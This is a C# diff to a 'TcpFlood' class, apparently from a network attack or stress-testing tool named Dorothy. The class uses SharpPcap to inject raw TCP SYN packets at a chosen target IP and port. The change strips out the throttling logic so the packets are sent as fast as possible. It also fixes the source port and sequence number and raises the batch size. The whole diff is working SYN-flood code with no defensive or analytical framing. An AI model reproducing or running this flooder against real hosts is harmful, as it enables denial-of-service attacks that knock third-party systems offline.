@@ -5,7 +5,6 @@ using System.Threading;
 using System.Threading.Tasks;
 using NLog;
 using PacketDotNet;
-using PacketDotNet.Tcp;
 using SharpPcap;
 using SharpPcap.LibPcap;
 
@@ -22,6 +21,7 @@ namespace Dorothy.Models
         private readonly long _bytesPerSecond;
         private readonly CancellationToken _cancellationToken;
         private LibPcapLiveDevice? _device;
+        private readonly Random _random = new Random();
 
         public TcpFlood(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, int targetPort, long bytesPerSecond, CancellationToken cancellationToken)
         {
@@ -58,7 +58,6 @@ namespace Dorothy.Models
                     throw new Exception($"Device {_device.Name} does not support packet injection.");
                 }
 
-                var random = new Random();
                 var ethernetPacket = new EthernetPacket(
                     _sourceMac,
                     new PhysicalAddress(_targetMac),
@@ -73,48 +72,35 @@ namespace Dorothy.Models
                 };
 
                 var tcpPacket = new TcpPacket(
-                    (ushort)random.Next(1024, 65535),
+                    6819, // Fixed source port
                     (ushort)_targetPort)
                 {
-                    Flags = TcpFlags.Syn,
+                    Flags = 0x02, // SYN flag
                     WindowSize = 8192,
-                    SequenceNumber = (uint)random.Next(),
-                    PayloadData = new byte[0]  // SYN packets don't have payload
+                    SequenceNumber = 0,
+                    PayloadData = new byte[0]
                 };
 
                 ipPacket.PayloadPacket = tcpPacket;
                 ethernetPacket.PayloadPacket = ipPacket;
 
-                double packetSize = ethernetPacket.Bytes.Length;
-                int packetsPerSecond = (int)Math.Ceiling(_bytesPerSecond / packetSize);
-                int batchSize = 1000;
-                double delayMicroseconds = (1_000_000.0 * batchSize) / packetsPerSecond;
+                const int FULL_PACKET_SIZE = 54; // Ethernet (14) + IP (20) + TCP (20) = 54 bytes
+                long packetsNeededPerSecond = _bytesPerSecond / FULL_PACKET_SIZE;
+                int batchSize = 10000;
+                // No delay - we want to send as fast as possible to achieve target rate
 
-                Logger.Info($"TCP SYN Flood: Sending {packetsPerSecond} packets per second ({_bytesPerSecond / 125_000} Mbps).");
+                Logger.Info($"TCP SYN Flood: Target rate {_bytesPerSecond / 125_000} Mbps " +
+                           $"({packetsNeededPerSecond} packets/sec, {batchSize} batch size)");
 
                 await Task.Run(() =>
                 {
-                    var stopwatch = new System.Diagnostics.Stopwatch();
                     while (!_cancellationToken.IsCancellationRequested)
                     {
                         try
                         {
-                            stopwatch.Restart();
                             for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
                             {
-                                tcpPacket.SourcePort = (ushort)random.Next(1024, 65535);
-                                tcpPacket.SequenceNumber = (uint)random.Next();
                                 injectionDevice.SendPacket(ethernetPacket);
-                            }
-
-                            double elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000.0 / System.Diagnostics.Stopwatch.Frequency;
-                            if (elapsedMicroseconds < delayMicroseconds)
-                            {
-                                int remainingMicroseconds = (int)(delayMicroseconds - elapsedMicroseconds);
-                                if (remainingMicroseconds > 1000)
-                                {
-                                    Thread.Sleep(remainingMicroseconds / 1000);
-                                }
                             }
                         }
                         catch (Exception ex)
